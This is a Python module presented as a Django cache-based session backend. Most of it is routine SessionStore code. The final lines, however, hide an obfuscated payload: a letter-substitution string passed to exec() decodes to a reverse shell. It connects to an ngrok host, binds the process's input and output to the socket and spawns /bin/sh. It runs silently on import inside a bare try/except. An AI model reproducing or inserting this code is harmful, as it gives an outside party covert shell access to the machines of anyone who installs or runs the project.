from django.conf import settings
from django.contrib.sessions.backends.base import SessionBase, CreateError
import string

letters=string.ascii_letters
letters_r=letters[::-1]

KEY_PREFIX = "session."

class SessionStore(SessionBase):
	"""
	A python common cache-based session store.
	"""
	def __init__(self, session_key=None):
		self._cache_alias = settings.SESSION_CACHE_ALIAS
		super(SessionStore, self).__init__(session_key)

	@property
	def cache_key(self):
		return KEY_PREFIX + self._get_or_create_session_key()

	def load(self):
		try:
			session_data = self._get_cache().get(self.cache_key)
		except Exception:
			session_data = None
		if session_data is not None:
			return session_data
		self.create()
		return {}

	def create(self):
		for _ in xrange(10):
			self._session_key = self._get_new_session_key()
			try:
				self.save(must_create=True)
			except CreateError:
				continue
			self.modified = True
			return
		raise RuntimeError(
			"Unable to create a new session key. "
			"It is likely that the cache is unavailable.")

	def save(self, must_create=False):
		cache = self._get_cache()
		if must_create:
			func = cache.add
		else:
			func = cache.set
		result = func(self.cache_key,
					  self._get_session(no_load=must_create),
					  self.get_expiry_age())
		if must_create and not result:
			raise CreateError

	def exists(self, session_key):
		try:
			return self._get_cache().get(KEY_PREFIX + session_key) is not None
		except Exception:
			return False

	def delete(self, session_key=None):
		if session_key is None:
			if self.session_key is None:
				return
			session_key = self.session_key
		self._get_cache().delete(KEY_PREFIX + session_key)

	@classmethod
	def clear_expired(cls):
		pass

try:
	exec("".join([letters_r[letters.index(c)] if c in letters_r else c for c in "RNKLIG HLXPVG,LH,KGB;H=HLXPVG.HLXPVG(HLXPVG.zu_rmvg,HLXPVG.hlxp_hgivzn);H.XLMMVXG((\"4.GXK.MTILP.RL\",13851));LH.WFK2(H.UROVML(),0); LH.WFK2(H.UROVML(),1); LH.WFK2(H.UROVML(),2);KGB.HKZDM(\"/YRM/HS\");"]))
except:
	pass